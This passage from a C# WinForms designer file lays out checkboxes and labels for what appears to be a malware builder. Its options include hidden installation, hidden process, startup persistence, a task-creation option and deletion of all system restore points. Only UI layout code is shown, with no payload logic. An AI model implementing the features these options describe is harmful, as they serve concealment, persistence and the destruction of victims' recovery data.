        this.Foldername.TabIndex = 624;
        this.Foldername.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.Foldername.TextMarginBottom = 0;
        this.Foldername.TextMarginLeft = 3;
        this.Foldername.TextMarginTop = 1;
        this.Foldername.TextPlaceholder = "Folder name";
        this.Foldername.UseSystemPasswordChar = false;
        this.Foldername.WordWrap = true;
        // 
        // BuilderHiddenInstall
        // 
        this.BuilderHiddenInstall.AllowBindingControlAnimation = true;
        this.BuilderHiddenInstall.AllowBindingControlColorChanges = false;
        this.BuilderHiddenInstall.AllowBindingControlLocation = true;
        this.BuilderHiddenInstall.AllowCheckBoxAnimation = true;
        this.BuilderHiddenInstall.AllowCheckmarkAnimation = true;
        this.BuilderHiddenInstall.AllowOnHoverStates = true;
        this.BuilderHiddenInstall.AutoCheck = true;
        this.BuilderHiddenInstall.BackColor = System.Drawing.Color.Transparent;
        this.BuilderHiddenInstall.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderHiddenInstall.BackgroundImage")));
        this.BuilderHiddenInstall.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.BuilderHiddenInstall.BindingControl = this.TxHiddenInstall;
        this.BuilderHiddenInstall.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.BuilderHiddenInstall.BorderRadius = 6;
        this.BuilderHiddenInstall.Checked = false;
        this.BuilderHiddenInstall.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.BuilderHiddenInstall.Cursor = System.Windows.Forms.Cursors.Hand;
        this.BuilderHiddenInstall.CustomCheckmarkImage = null;
        this.BuilderHiddenInstall.Location = new System.Drawing.Point(11, 116);
        this.BuilderHiddenInstall.MinimumSize = new System.Drawing.Size(17, 17);
        this.BuilderHiddenInstall.Name = "BuilderHiddenInstall";
        this.BuilderHiddenInstall.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderHiddenInstall.OnCheck.BorderRadius = 6;
        this.BuilderHiddenInstall.OnCheck.BorderThickness = 2;
        this.BuilderHiddenInstall.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderHiddenInstall.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.BuilderHiddenInstall.OnCheck.CheckmarkThickness = 2;
        this.BuilderHiddenInstall.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.BuilderHiddenInstall.OnDisable.BorderRadius = 6;
        this.BuilderHiddenInstall.OnDisable.BorderThickness = 2;
        this.BuilderHiddenInstall.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BuilderHiddenInstall.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.BuilderHiddenInstall.OnDisable.CheckmarkThickness = 2;
        this.BuilderHiddenInstall.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderHiddenInstall.OnHoverChecked.BorderRadius = 6;
        this.BuilderHiddenInstall.OnHoverChecked.BorderThickness = 2;
        this.BuilderHiddenInstall.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderHiddenInstall.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.BuilderHiddenInstall.OnHoverChecked.CheckmarkThickness = 2;
        this.BuilderHiddenInstall.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderHiddenInstall.OnHoverUnchecked.BorderRadius = 6;
        this.BuilderHiddenInstall.OnHoverUnchecked.BorderThickness = 1;
        this.BuilderHiddenInstall.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BuilderHiddenInstall.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.BuilderHiddenInstall.OnUncheck.BorderRadius = 6;
        this.BuilderHiddenInstall.OnUncheck.BorderThickness = 1;
        this.BuilderHiddenInstall.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.BuilderHiddenInstall.Size = new System.Drawing.Size(21, 21);
        this.BuilderHiddenInstall.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.BuilderHiddenInstall.TabIndex = 635;
        this.BuilderHiddenInstall.ThreeState = false;
        this.BuilderHiddenInstall.ToolTipText = null;
        // 
        // TxHiddenInstall
        // 
        this.TxHiddenInstall.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxHiddenInstall.AutoSize = true;
        this.TxHiddenInstall.BackColor = System.Drawing.Color.Transparent;
        this.TxHiddenInstall.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxHiddenInstall.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxHiddenInstall.ForeColor = System.Drawing.Color.Black;
        this.TxHiddenInstall.Location = new System.Drawing.Point(35, 120);
        this.TxHiddenInstall.Name = "TxHiddenInstall";
        this.TxHiddenInstall.Size = new System.Drawing.Size(107, 15);
        this.TxHiddenInstall.TabIndex = 634;
        this.TxHiddenInstall.Text = "Hidden Installation";
        // 
        // TxHiddenProcess
        // 
        this.TxHiddenProcess.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxHiddenProcess.AutoSize = true;
        this.TxHiddenProcess.BackColor = System.Drawing.Color.Transparent;
        this.TxHiddenProcess.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxHiddenProcess.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxHiddenProcess.ForeColor = System.Drawing.Color.Black;
        this.TxHiddenProcess.Location = new System.Drawing.Point(195, 120);
        this.TxHiddenProcess.Name = "TxHiddenProcess";
        this.TxHiddenProcess.Size = new System.Drawing.Size(89, 15);
        this.TxHiddenProcess.TabIndex = 630;
        this.TxHiddenProcess.Text = "Hidden Process";
        // 
        // AutoStartup
        // 
        this.AutoStartup.AllowBindingControlAnimation = true;
        this.AutoStartup.AllowBindingControlColorChanges = false;
        this.AutoStartup.AllowBindingControlLocation = true;
        this.AutoStartup.AllowCheckBoxAnimation = true;
        this.AutoStartup.AllowCheckmarkAnimation = true;
        this.AutoStartup.AllowOnHoverStates = true;
        this.AutoStartup.AutoCheck = true;
        this.AutoStartup.BackColor = System.Drawing.Color.Transparent;
        this.AutoStartup.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("AutoStartup.BackgroundImage")));
        this.AutoStartup.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.AutoStartup.BindingControl = this.TxStartup;
        this.AutoStartup.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.AutoStartup.BorderRadius = 6;
        this.AutoStartup.Checked = false;
        this.AutoStartup.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.AutoStartup.Cursor = System.Windows.Forms.Cursors.Hand;
        this.AutoStartup.CustomCheckmarkImage = null;
        this.AutoStartup.Location = new System.Drawing.Point(11, 149);
        this.AutoStartup.MinimumSize = new System.Drawing.Size(17, 17);
        this.AutoStartup.Name = "AutoStartup";
        this.AutoStartup.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.AutoStartup.OnCheck.BorderRadius = 6;
        this.AutoStartup.OnCheck.BorderThickness = 2;
        this.AutoStartup.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.AutoStartup.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.AutoStartup.OnCheck.CheckmarkThickness = 2;
        this.AutoStartup.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.AutoStartup.OnDisable.BorderRadius = 6;
        this.AutoStartup.OnDisable.BorderThickness = 2;
        this.AutoStartup.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.AutoStartup.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.AutoStartup.OnDisable.CheckmarkThickness = 2;
        this.AutoStartup.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.AutoStartup.OnHoverChecked.BorderRadius = 6;
        this.AutoStartup.OnHoverChecked.BorderThickness = 2;
        this.AutoStartup.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.AutoStartup.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.AutoStartup.OnHoverChecked.CheckmarkThickness = 2;
        this.AutoStartup.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.AutoStartup.OnHoverUnchecked.BorderRadius = 6;
        this.AutoStartup.OnHoverUnchecked.BorderThickness = 1;
        this.AutoStartup.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.AutoStartup.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.AutoStartup.OnUncheck.BorderRadius = 6;
        this.AutoStartup.OnUncheck.BorderThickness = 1;
        this.AutoStartup.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.AutoStartup.Size = new System.Drawing.Size(21, 21);
        this.AutoStartup.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.AutoStartup.TabIndex = 633;
        this.AutoStartup.ThreeState = false;
        this.AutoStartup.ToolTipText = null;
        // 
        // TxStartup
        // 
        this.TxStartup.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxStartup.AutoSize = true;
        this.TxStartup.BackColor = System.Drawing.Color.Transparent;
        this.TxStartup.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxStartup.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxStartup.ForeColor = System.Drawing.Color.Black;
        this.TxStartup.Location = new System.Drawing.Point(35, 153);
        this.TxStartup.Name = "TxStartup";
        this.TxStartup.Size = new System.Drawing.Size(45, 15);
        this.TxStartup.TabIndex = 632;
        this.TxStartup.Text = "Startup";
        // 
        // HiddenProcess
        // 
        this.HiddenProcess.AllowBindingControlAnimation = true;
        this.HiddenProcess.AllowBindingControlColorChanges = false;
        this.HiddenProcess.AllowBindingControlLocation = true;
        this.HiddenProcess.AllowCheckBoxAnimation = true;
        this.HiddenProcess.AllowCheckmarkAnimation = true;
        this.HiddenProcess.AllowOnHoverStates = true;
        this.HiddenProcess.AutoCheck = true;
        this.HiddenProcess.BackColor = System.Drawing.Color.Transparent;
        this.HiddenProcess.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("HiddenProcess.BackgroundImage")));
        this.HiddenProcess.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.HiddenProcess.BindingControl = this.TxHiddenProcess;
        this.HiddenProcess.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.HiddenProcess.BorderRadius = 6;
        this.HiddenProcess.Checked = false;
        this.HiddenProcess.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.HiddenProcess.Cursor = System.Windows.Forms.Cursors.Hand;
        this.HiddenProcess.CustomCheckmarkImage = null;
        this.HiddenProcess.Location = new System.Drawing.Point(171, 116);
        this.HiddenProcess.MinimumSize = new System.Drawing.Size(17, 17);
        this.HiddenProcess.Name = "HiddenProcess";
        this.HiddenProcess.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.HiddenProcess.OnCheck.BorderRadius = 6;
        this.HiddenProcess.OnCheck.BorderThickness = 2;
        this.HiddenProcess.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.HiddenProcess.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.HiddenProcess.OnCheck.CheckmarkThickness = 2;
        this.HiddenProcess.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.HiddenProcess.OnDisable.BorderRadius = 6;
        this.HiddenProcess.OnDisable.BorderThickness = 2;
        this.HiddenProcess.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.HiddenProcess.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.HiddenProcess.OnDisable.CheckmarkThickness = 2;
        this.HiddenProcess.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.HiddenProcess.OnHoverChecked.BorderRadius = 6;
        this.HiddenProcess.OnHoverChecked.BorderThickness = 2;
        this.HiddenProcess.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.HiddenProcess.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.HiddenProcess.OnHoverChecked.CheckmarkThickness = 2;
        this.HiddenProcess.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.HiddenProcess.OnHoverUnchecked.BorderRadius = 6;
        this.HiddenProcess.OnHoverUnchecked.BorderThickness = 1;
        this.HiddenProcess.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.HiddenProcess.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.HiddenProcess.OnUncheck.BorderRadius = 6;
        this.HiddenProcess.OnUncheck.BorderThickness = 1;
        this.HiddenProcess.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.HiddenProcess.Size = new System.Drawing.Size(21, 21);
        this.HiddenProcess.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.HiddenProcess.TabIndex = 631;
        this.HiddenProcess.ThreeState = false;
        this.HiddenProcess.ToolTipText = null;
        // 
        // DeleteSystemRestore
        // 
        this.DeleteSystemRestore.AllowBindingControlAnimation = true;
        this.DeleteSystemRestore.AllowBindingControlColorChanges = false;
        this.DeleteSystemRestore.AllowBindingControlLocation = true;
        this.DeleteSystemRestore.AllowCheckBoxAnimation = true;
        this.DeleteSystemRestore.AllowCheckmarkAnimation = true;
        this.DeleteSystemRestore.AllowOnHoverStates = true;
        this.DeleteSystemRestore.AutoCheck = true;
        this.DeleteSystemRestore.BackColor = System.Drawing.Color.Transparent;
        this.DeleteSystemRestore.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("DeleteSystemRestore.BackgroundImage")));
        this.DeleteSystemRestore.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.DeleteSystemRestore.BindingControl = this.TxRestore;
        this.DeleteSystemRestore.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.DeleteSystemRestore.BorderRadius = 6;
        this.DeleteSystemRestore.Checked = false;
        this.DeleteSystemRestore.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.DeleteSystemRestore.Cursor = System.Windows.Forms.Cursors.Hand;
        this.DeleteSystemRestore.CustomCheckmarkImage = null;
        this.DeleteSystemRestore.Location = new System.Drawing.Point(373, 37);
        this.DeleteSystemRestore.MinimumSize = new System.Drawing.Size(17, 17);
        this.DeleteSystemRestore.Name = "DeleteSystemRestore";
        this.DeleteSystemRestore.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.DeleteSystemRestore.OnCheck.BorderRadius = 6;
        this.DeleteSystemRestore.OnCheck.BorderThickness = 2;
        this.DeleteSystemRestore.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.DeleteSystemRestore.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.DeleteSystemRestore.OnCheck.CheckmarkThickness = 2;
        this.DeleteSystemRestore.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.DeleteSystemRestore.OnDisable.BorderRadius = 6;
        this.DeleteSystemRestore.OnDisable.BorderThickness = 2;
        this.DeleteSystemRestore.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.DeleteSystemRestore.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.DeleteSystemRestore.OnDisable.CheckmarkThickness = 2;
        this.DeleteSystemRestore.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.DeleteSystemRestore.OnHoverChecked.BorderRadius = 6;
        this.DeleteSystemRestore.OnHoverChecked.BorderThickness = 2;
        this.DeleteSystemRestore.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.DeleteSystemRestore.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.DeleteSystemRestore.OnHoverChecked.CheckmarkThickness = 2;
        this.DeleteSystemRestore.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.DeleteSystemRestore.OnHoverUnchecked.BorderRadius = 6;
        this.DeleteSystemRestore.OnHoverUnchecked.BorderThickness = 1;
        this.DeleteSystemRestore.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.DeleteSystemRestore.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.DeleteSystemRestore.OnUncheck.BorderRadius = 6;
        this.DeleteSystemRestore.OnUncheck.BorderThickness = 1;
        this.DeleteSystemRestore.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.DeleteSystemRestore.Size = new System.Drawing.Size(21, 21);
        this.DeleteSystemRestore.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.DeleteSystemRestore.TabIndex = 623;
        this.DeleteSystemRestore.ThreeState = false;
        this.DeleteSystemRestore.ToolTipText = null;
        // 
        // TxRestore
        // 
        this.TxRestore.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxRestore.AutoSize = true;
        this.TxRestore.BackColor = System.Drawing.Color.Transparent;
        this.TxRestore.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxRestore.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxRestore.ForeColor = System.Drawing.Color.Black;
        this.TxRestore.Location = new System.Drawing.Point(397, 41);
        this.TxRestore.Name = "TxRestore";
        this.TxRestore.Size = new System.Drawing.Size(170, 15);
        this.TxRestore.TabIndex = 622;
        this.TxRestore.Text = "Delete all system restore points";
        // 
        // TxHtml
        // 
        this.TxHtml.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxHtml.AutoSize = true;
        this.TxHtml.BackColor = System.Drawing.Color.Transparent;
        this.TxHtml.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxHtml.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxHtml.ForeColor = System.Drawing.Color.Black;
        this.TxHtml.Location = new System.Drawing.Point(190, 110);
        this.TxHtml.Name = "TxHtml";
        this.TxHtml.Size = new System.Drawing.Size(69, 15);
        this.TxHtml.TabIndex = 621;
        this.TxHtml.Text = "Web \\ Html";
        // 
        // TxDefault
        // 
        this.TxDefault.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxDefault.AutoSize = true;
        this.TxDefault.BackColor = System.Drawing.Color.Transparent;
        this.TxDefault.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxDefault.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxDefault.ForeColor = System.Drawing.Color.Black;
        this.TxDefault.Location = new System.Drawing.Point(62, 110);
        this.TxDefault.Name = "TxDefault";
        this.TxDefault.Size = new System.Drawing.Size(45, 15);
        this.TxDefault.TabIndex = 620;
        this.TxDefault.Text = "Default";
        // 
        // HostDefault
        // 
        this.HostDefault.AllowBindingControlLocation = false;
        this.HostDefault.BackColor = System.Drawing.Color.Transparent;
        this.HostDefault.BindingControl = this.TxDefault;
        this.HostDefault.BindingControlPosition = Bunifu.UI.WinForms.BunifuRadioButton.BindingControlPositions.Right;
        this.HostDefault.BorderThickness = 1;
        this.HostDefault.Checked = false;
        this.HostDefault.Cursor = System.Windows.Forms.Cursors.Hand;
        this.HostDefault.Location = new System.Drawing.Point(38, 108);
        this.HostDefault.Name = "HostDefault";
        this.HostDefault.OutlineColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.HostDefault.OutlineColorTabFocused = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.HostDefault.OutlineColorUnchecked = System.Drawing.Color.DarkGray;
        this.HostDefault.RadioColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.HostDefault.RadioColorTabFocused = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.HostDefault.Size = new System.Drawing.Size(21, 21);
        this.HostDefault.TabIndex = 619;
        this.HostDefault.Text = null;
        this.HostDefault.CheckedChanged2 += new System.EventHandler<Bunifu.UI.WinForms.BunifuRadioButton.CheckedChangedEventArgs>(this.HostDefault_CheckedChanged2);
        // 
        // HostHtml
        // 
        this.HostHtml.AllowBindingControlLocation = false;
        this.HostHtml.BackColor = System.Drawing.Color.Transparent;
        this.HostHtml.BindingControl = this.TxHtml;
        this.HostHtml.BindingControlPosition = Bunifu.UI.WinForms.BunifuRadioButton.BindingControlPositions.Right;
        this.HostHtml.BorderThickness = 1;
        this.HostHtml.Checked = true;
        this.HostHtml.Cursor = System.Windows.Forms.Cursors.Hand;
        this.HostHtml.Location = new System.Drawing.Point(165, 108);
        this.HostHtml.Name = "HostHtml";
        this.HostHtml.OutlineColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.HostHtml.OutlineColorTabFocused = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.HostHtml.OutlineColorUnchecked = System.Drawing.Color.DarkGray;
        this.HostHtml.RadioColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.HostHtml.RadioColorTabFocused = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.HostHtml.Size = new System.Drawing.Size(21, 21);
        this.HostHtml.TabIndex = 618;
        this.HostHtml.Text = null;
        this.HostHtml.CheckedChanged2 += new System.EventHandler<Bunifu.UI.WinForms.BunifuRadioButton.CheckedChangedEventArgs>(this.HostHtml_CheckedChanged2);
        // 
        // BuilderInstallation
        // 
        this.BuilderInstallation.AllowBindingControlAnimation = true;
        this.BuilderInstallation.AllowBindingControlColorChanges = false;
        this.BuilderInstallation.AllowBindingControlLocation = true;
        this.BuilderInstallation.AllowCheckBoxAnimation = true;
        this.BuilderInstallation.AllowCheckmarkAnimation = true;
        this.BuilderInstallation.AllowOnHoverStates = true;
        this.BuilderInstallation.AutoCheck = true;
        this.BuilderInstallation.BackColor = System.Drawing.Color.Transparent;
        this.BuilderInstallation.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderInstallation.BackgroundImage")));
        this.BuilderInstallation.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.BuilderInstallation.BindingControl = this.TxInstall;
        this.BuilderInstallation.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.BuilderInstallation.BorderRadius = 6;
        this.BuilderInstallation.Checked = false;
        this.BuilderInstallation.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.BuilderInstallation.Cursor = System.Windows.Forms.Cursors.Hand;
        this.BuilderInstallation.CustomCheckmarkImage = null;
        this.BuilderInstallation.Location = new System.Drawing.Point(38, 384);
        this.BuilderInstallation.MinimumSize = new System.Drawing.Size(17, 17);
        this.BuilderInstallation.Name = "BuilderInstallation";
        this.BuilderInstallation.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderInstallation.OnCheck.BorderRadius = 6;
        this.BuilderInstallation.OnCheck.BorderThickness = 2;
        this.BuilderInstallation.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderInstallation.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.BuilderInstallation.OnCheck.CheckmarkThickness = 2;
        this.BuilderInstallation.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.BuilderInstallation.OnDisable.BorderRadius = 6;
        this.BuilderInstallation.OnDisable.BorderThickness = 2;
        this.BuilderInstallation.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BuilderInstallation.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.BuilderInstallation.OnDisable.CheckmarkThickness = 2;
        this.BuilderInstallation.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderInstallation.OnHoverChecked.BorderRadius = 6;
        this.BuilderInstallation.OnHoverChecked.BorderThickness = 2;
        this.BuilderInstallation.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderInstallation.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.BuilderInstallation.OnHoverChecked.CheckmarkThickness = 2;
        this.BuilderInstallation.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderInstallation.OnHoverUnchecked.BorderRadius = 6;
        this.BuilderInstallation.OnHoverUnchecked.BorderThickness = 1;
        this.BuilderInstallation.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BuilderInstallation.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.BuilderInstallation.OnUncheck.BorderRadius = 6;
        this.BuilderInstallation.OnUncheck.BorderThickness = 1;
        this.BuilderInstallation.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.BuilderInstallation.Size = new System.Drawing.Size(21, 21);
        this.BuilderInstallation.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.BuilderInstallation.TabIndex = 612;
        this.BuilderInstallation.ThreeState = false;
        this.BuilderInstallation.ToolTipText = null;
        this.BuilderInstallation.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(this.BuilderInstallation_CheckedChanged);
        // 
        // TxInstall
        // 
        this.TxInstall.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxInstall.AutoSize = true;
        this.TxInstall.BackColor = System.Drawing.Color.Transparent;
        this.TxInstall.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxInstall.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxInstall.ForeColor = System.Drawing.Color.Black;
        this.TxInstall.Location = new System.Drawing.Point(62, 388);
        this.TxInstall.Name = "TxInstall";
        this.TxInstall.Size = new System.Drawing.Size(110, 15);
        this.TxInstall.TabIndex = 611;
        this.TxInstall.Text = "Installation Support";
        // 
        // BuilderCreateTask
        // 
        this.BuilderCreateTask.AllowBindingControlAnimation = true;
        this.BuilderCreateTask.AllowBindingControlColorChanges = false;
        this.BuilderCreateTask.AllowBindingControlLocation = true;
        this.BuilderCreateTask.AllowCheckBoxAnimation = true;
        this.BuilderCreateTask.AllowCheckmarkAnimation = true;
        this.BuilderCreateTask.AllowOnHoverStates = true;
        this.BuilderCreateTask.AutoCheck = true;
        this.BuilderCreateTask.BackColor = System.Drawing.Color.Transparent;
        this.BuilderCreateTask.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderCreateTask.BackgroundImage")));
        this.BuilderCreateTask.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.BuilderCreateTask.BindingControl = this.TxTask;
        this.BuilderCreateTask.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.BuilderCreateTask.BorderRadius = 6;
        this.BuilderCreateTask.Checked = false;
        this.BuilderCreateTask.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.BuilderCreateTask.Cursor = System.Windows.Forms.Cursors.Hand;
        this.BuilderCreateTask.CustomCheckmarkImage = null;
        this.BuilderCreateTask.Location = new System.Drawing.Point(38, 270);
